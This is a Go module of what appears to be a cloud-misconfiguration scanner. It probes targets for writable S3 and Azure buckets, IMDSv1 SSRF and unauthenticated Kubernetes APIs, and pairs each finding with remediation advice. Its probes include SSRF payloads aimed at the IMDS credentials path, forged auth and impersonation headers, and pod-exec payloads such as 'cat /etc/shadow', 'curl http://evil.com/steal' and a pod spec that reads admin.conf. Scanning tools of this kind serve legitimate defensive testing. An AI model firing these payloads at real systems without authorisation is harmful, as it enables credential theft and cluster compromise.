package cloudkill

import (
	"context"
	"fmt"
	"strings"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type CloudKillModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
	host   string
}

func (m *CloudKillModule) ID() string   { return "cloudkill" }
func (m *CloudKillModule) Name() string { return "CloudKill - Destructive Misconfiguration Hunter" }
func (m *CloudKillModule) Description() string {
	return "Detects cloud exposures that enable destruction: writable storage, IMDSv1 metadata, unprotected Kubernetes API"
}
func (m *CloudKillModule) Severity() models.Severity { return models.Critical }

func (m *CloudKillModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *CloudKillModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	m.host = target.Domain
	var findings []*models.Finding

	findings = append(findings, m.checkWritableS3(ctx)...)
	findings = append(findings, m.checkWritableBlobs(ctx)...)
	findings = append(findings, m.checkIMDSv1(ctx, target)...)
	findings = append(findings, m.checkUnprotectedK8s(ctx, target)...)

	return findings, nil
}

func (m *CloudKillModule) candidateNames() []string {
	base := strings.ReplaceAll(m.host, ".", "-")
	return []string{base, base + "-assets", base + "-backup", base + "-prod", base + "-public", base + "-storage"}
}

func (m *CloudKillModule) checkWritableS3(ctx context.Context) []*models.Finding {
	var findings []*models.Finding
	for _, name := range m.candidateNames() {
		u := fmt.Sprintf("https://%s.s3.amazonaws.com/test-write-%d", name, 1)
		resp, err := m.client.Put(u, "fang-probe")
		if err != nil || resp == nil {
			continue
		}
		if resp.StatusCode == 200 || resp.StatusCode == 204 {
			findings = append(findings, m.finding(
				"Writable S3 Bucket (Deletion Risk)",
				models.Critical, models.HighConfidence,
				u, "", name,
				fmt.Sprintf("Bucket '%s' accepted an unauthenticated PUT (status %d)", name, resp.StatusCode),
				"Block public write access, enable S3 Versioning + Object Lock, and require MFA Delete.",
				"CWE-732",
			))
		}
	}
	return findings
}

func (m *CloudKillModule) checkWritableBlobs(ctx context.Context) []*models.Finding {
	var findings []*models.Finding
	for _, name := range m.candidateNames() {
		u := fmt.Sprintf("https://%s.blob.core.windows.net/fang-probe-%d", name, 1)
		resp, err := m.client.Put(u, "fang-probe")
		if err != nil || resp == nil {
			continue
		}
		if resp.StatusCode == 201 {
			findings = append(findings, m.finding(
				"Writable Azure Blob Container (Deletion Risk)",
				models.Critical, models.HighConfidence,
				u, "", name,
				fmt.Sprintf("Container '%s' accepted an unauthenticated PUT (status %d)", name, resp.StatusCode),
				"Set the container ACL to private and scope SAS tokens to read-only with short expiry.",
				"CWE-732",
			))
		}
	}
	return findings
}

func (m *CloudKillModule) checkIMDSv1(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding
	base := strings.TrimRight(target.URL, "/")
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	}
	params := []string{"url", "path", "host", "redirect"}
	markers := []string{"ami-id", "instance-id", "security-credentials", "privateKey"}
	for _, p := range params {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s?%s=%s", base, p, payload)
			resp, err := m.client.Get(testURL)
			if err != nil || resp == nil {
				continue
			}
			lower := strings.ToLower(resp.Body)
			for _, marker := range markers {
				if strings.Contains(lower, marker) {
					findings = append(findings, m.finding(
						"IMDSv1 Metadata SSRF (Credential Theft / Destruction)",
						models.Critical, models.HighConfidence,
						testURL, p, payload,
						fmt.Sprintf("Response leaks cloud metadata marker '%s' via IMDSv1", marker),
						"Enforce IMDSv2 (session tokens) and block outbound access to 169.254.169.254 from app tier.",
						"CWE-918",
					))
					break
				}
			}
		}
	}
	return findings
}

func (m *CloudKillModule) checkUnprotectedK8s(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding
	base := strings.TrimRight(target.URL, "/")

	k8sProbes := []struct {
		path     string
		name     string
		severity models.Severity
		checks   []string
		cwe      string
	}{
		{path: "/api", name: "Unauthenticated Kubernetes API", severity: models.Critical, checks: []string{"kind", "\"major\""}, cwe: "CWE-306"},
		{path: "/api/v1", name: "K8s API v1 Discovery", severity: models.Critical, checks: []string{"resources", "apiVersion", "groupVersion"}, cwe: "CWE-306"},
		{path: "/api/v1/pods", name: "K8s Pod Listing (Unauthenticated)", severity: models.Critical, checks: []string{"kind", "items", "\"metadata\""}, cwe: "CWE-306"},
		{path: "/api/v1/namespaces/default/secrets", name: "K8s Secret Access (Unauthenticated)", severity: models.Critical, checks: []string{"kind", "data", "Secrets"}, cwe: "CWE-306"},
		{path: "/api/v1/namespaces/kube-system/secrets", name: "K8s Kube-System Secret Access", severity: models.Critical, checks: []string{"kind", "data", "Secrets"}, cwe: "CWE-306"},
		{path: "/api/v1/nodes", name: "K8s Node Listing (Unauthenticated)", severity: models.Critical, checks: []string{"kind", "items", "NodeList"}, cwe: "CWE-306"},
		{path: "/api/v1/namespaces", name: "K8s Namespace Enumeration", severity: models.High, checks: []string{"kind", "items", "NamespaceList"}, cwe: "CWE-200"},
		{path: "/apis/rbac.authorization.k8s.io/v1", name: "K8s RBAC API Discovery", severity: models.High, checks: []string{"resources", "apiVersion"}, cwe: "CWE-306"},
		{path: "/apis/rbac.authorization.k8s.io/v1/clusterroles", name: "K8s ClusterRole Listing", severity: models.Critical, checks: []string{"kind", "ClusterRole", "rules"}, cwe: "CWE-306"},
		{path: "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", name: "K8s ClusterRoleBinding Listing", severity: models.Critical, checks: []string{"kind", "ClusterRoleBinding", "subjects"}, cwe: "CWE-306"},
		{path: "/api/v1/configmaps", name: "K8s ConfigMap Access", severity: models.High, checks: []string{"kind", "ConfigMapList"}, cwe: "CWE-306"},
		{path: "/api/v1/serviceaccounts", name: "K8s ServiceAccount Listing", severity: models.High, checks: []string{"kind", "ServiceAccountList"}, cwe: "CWE-306"},
		{path: "/openapi/v2", name: "K8s OpenAPI Schema", severity: models.Medium, checks: []string{"swagger", "\"paths\""}, cwe: "CWE-200"},
		{path: "/version", name: "K8s Version Info", severity: models.Medium, checks: []string{"major", "minor", "gitVersion"}, cwe: "CWE-200"},
		{path: "/healthz", name: "K8s Health Endpoint", severity: models.Low, checks: []string{"ok"}, cwe: "CWE-200"},
		{path: "/livez", name: "K8s Livez Endpoint", severity: models.Low, checks: []string{"ok"}, cwe: "CWE-200"},
		{path: "/readyz", name: "K8s Readyz Endpoint", severity: models.Low, checks: []string{"ok"}, cwe: "CWE-200"},
	}

	for _, probe := range k8sProbes {
		u := base + probe.path
		resp, err := m.client.Get(u)
		if err != nil || resp == nil {
			continue
		}

		matched := false
		for _, check := range probe.checks {
			if strings.Contains(resp.Body, check) {
				matched = true
				break
			}
		}

		if matched {
			var evidence string
			switch probe.path {
			case "/api/v1/pods":
				evidence = "Kubernetes API allows unauthenticated pod listing — attacker can enumerate all running containers"
			case "/api/v1/namespaces/default/secrets", "/api/v1/namespaces/kube-system/secrets":
				evidence = "Kubernetes API exposes secrets without authentication — attacker can extract all credentials and tokens"
			case "/api/v1/nodes":
				evidence = "Kubernetes API exposes node list — attacker can identify worker nodes for lateral movement"
			case "/apis/rbac.authorization.k8s.io/v1/clusterroles":
				evidence = "Kubernetes RBAC API exposes cluster roles — attacker can enumerate all permissions and escalate"
			case "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings":
				evidence = "Kubernetes RBAC API exposes cluster role bindings — attacker can identify high-privilege subjects"
			case "/api/v1/namespaces":
				evidence = "Kubernetes API exposes all namespaces — attacker can identify attack surface"
			case "/api/v1/configmaps":
				evidence = "Kubernetes API exposes ConfigMaps — may contain configuration secrets and credentials"
			case "/api/v1/serviceaccounts":
				evidence = "Kubernetes API exposes ServiceAccounts — attacker can enumerate pods and their identities"
			default:
				evidence = fmt.Sprintf("Kubernetes API endpoint %s is accessible without authentication", probe.path)
			}

			findings = append(findings, m.finding(
				probe.name,
				probe.severity, models.HighConfidence,
				u, "", probe.path,
				evidence,
				"Require authentication and authorization on the Kubernetes API server. Enable RBAC. Network-restrict :6443. Use webhook token review. Audit API server logs.",
				probe.cwe,
			))
		}
	}

	authBypassHeaders := []map[string]string{
		{"Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIn0"},
		{"X-Remote-User": "admin"},
		{"X-Remote-Group": "system:masters"},
		{"Impersonate-User": "admin"},
		{"Impersonate-Group": "system:masters"},
		{"Authorization": "Bearer kubeadmin"},
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Forwarded-Host": "kubernetes.default.svc"},
	}

	podExecPayloads := []string{
		`{"command":["cat","/etc/shadow"]}`,
		`{"command":["kubectl","get","secrets","--all-namespaces"]}`,
		`{"command":["curl","http://evil.com/steal"]}`,
		`{"metadata":{"name":"malicious-pod"},"spec":{"containers":[{"name":"attacker","image":"alpine","command":["/bin/sh","-c","cat /etc/kubernetes/admin.conf"]}]}}`,
	}

	for _, headers := range authBypassHeaders {
		for _, ep := range []string{"/api/v1/pods", "/api/v1/secrets", "/api"} {
			u := base + ep
			req := fanghttp.NewRequest("GET", u)
			for k, v := range headers {
				req.Headers[k] = v
			}
			resp, err := m.client.Do(req)
			if err != nil || resp == nil {
				continue
			}
			if resp.StatusCode == 200 && (strings.Contains(resp.Body, "kind") || strings.Contains(resp.Body, "items")) {
				evHeaders := ""
				for k, v := range headers {
					evHeaders += fmt.Sprintf("%s: %s, ", k, v[:minS(len(v), 30)])
				}
				findings = append(findings, m.finding(
					"K8s Auth Bypass via Header Injection",
					models.Critical, models.MediumConfidence,
					u, "", ep,
					fmt.Sprintf("K8s API accepted request with injected auth headers [%s] at %s (status: %d)", evHeaders, ep, resp.StatusCode),
					"Disable anonymous auth. Enable RBAC. Use webhook token authentication. Validate all authentication headers. Audit API server access logs.",
					"CWE-287",
				))
				break
			}
		}
	}

	for _, pe := range podExecPayloads {
		u := base + "/api/v1/namespaces/default/pods/exec"
		resp, err := m.client.Post(u, pe)
		if err != nil || resp == nil {
			continue
		}
		if resp.StatusCode == 200 || resp.StatusCode == 101 {
			findings = append(findings, m.finding(
				"K8s Pod Exec Access (Unauthenticated)",
				models.Critical, models.HighConfidence,
				u, "", "/api/v1/namespaces/default/pods/exec",
				"Kubernetes API allows unauthenticated pod exec — attacker can run arbitrary commands in containers",
				"Disable anonymous auth. Enable RBAC. Use Pod Security Policies. Network-restrict API server access.",
				"CWE-306",
			))
		}
	}

	return findings
}

func minS(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (m *CloudKillModule) finding(title string, severity models.Severity, confidence models.Confidence, urlStr, param, payload, evidence, remediation, cwe string) *models.Finding {
	return &models.Finding{
		Title:       title,
		Severity:    severity,
		Confidence:  confidence,
		URL:         urlStr,
		Parameter:   param,
		Payload:     payload,
		Evidence:    evidence,
		Description: remediation,
		Remediation: remediation,
		CWEID:       cwe,
		ModuleID:    "cloudkill",
	}
}

func init() {
	engine.GetRegistry().Register(&CloudKillModule{})
}
